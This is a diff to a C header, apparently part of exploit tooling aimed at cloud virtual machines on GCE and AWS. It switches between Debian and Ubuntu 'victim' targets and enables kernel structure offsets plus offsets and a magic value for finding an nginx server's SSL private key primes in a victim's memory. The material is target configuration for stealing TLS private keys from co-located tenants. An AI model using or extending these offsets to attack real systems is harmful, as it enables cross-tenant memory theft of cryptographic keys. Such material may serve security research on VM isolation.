@@ -48,6 +48,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 
 #elif MACHINE == GCE
 
+#if GCE_VICTIM == DEBIAN
 // ----------[Debian]----------
 #define G_INIT_NAME		"swapper/"
 #define G_TEXT_INIT_TASK	0x1a1aa40	// struct task_struct init_task (Debian)
@@ -73,29 +74,32 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
 #define SSLKEY_MAGIC		0x00818102
 
+#elif GCE_VICTIM == UBUNTU
 // // ----------[Ubuntu]----------
-// #define G_INIT_NAME		"swapper/"
-// #define G_TEXT_INIT_TASK	0x2011f80	// struct task_struct init_task
+#define G_INIT_NAME		"swapper/"
+#define G_TEXT_INIT_TASK	0x2011f80	// struct task_struct init_task
 
-// // struct task_struct {
-// #define G_TASK_TASKS		0x890	// struct list_head tasks
-// #define G_TASK_MM		0x8e0	// struct mm_struct *mm
-// #define G_TASK_PID		0x960	// pid_t pid, tgid
-// #define G_TASK_PARENT		0x970	// struct task_struct *real_parent TODO THIS IS ONLY GUESS
-// #define G_TASK_CHILDREN		0x980	// struct list_head children TODO THIS IS ONLY GUESS
-// #define G_TASK_SIBLING		0x990	// struct list_head sibling TODO THIS IS ONLY GUESS
-// #define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
-// #define G_TASK_COMM		0xb80	// char comm[TASK_COMM_LEN]
-// // };
+// struct task_struct {
+#define G_TASK_TASKS		0x890	// struct list_head tasks
+#define G_TASK_MM		0x8e0	// struct mm_struct *mm
+#define G_TASK_PID		0x960	// pid_t pid, tgid
+#define G_TASK_PARENT		0x970	// struct task_struct *real_parent TODO THIS IS ONLY GUESS
+#define G_TASK_CHILDREN		0x980	// struct list_head children TODO THIS IS ONLY GUESS
+#define G_TASK_SIBLING		0x990	// struct list_head sibling TODO THIS IS ONLY GUESS
+#define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
+#define G_TASK_COMM		0xb80	// char comm[TASK_COMM_LEN]
+// };
 
-// // struct mm_struct {
-// #define G_MM_PGD		0x78	// pgd_t *pgd
-// #define G_MM_HEAP		0x168	// unsigned long start_brk
-// // };
+// struct mm_struct {
+#define G_MM_PGD		0x78	// pgd_t *pgd
+#define G_MM_HEAP		0x168	// unsigned long start_brk
+// };
 
-// #define NGINX_SSLKEY		0x8b99f
-// #define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
-// #define SSLKEY_MAGIC		0x00818102
+#define NGINX_SSLKEY		0x8b99f
+#define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
+#define SSLKEY_MAGIC		0x00818102
+
+#endif // GCE_VICTIM
 
 #elif MACHINE == AWS
 
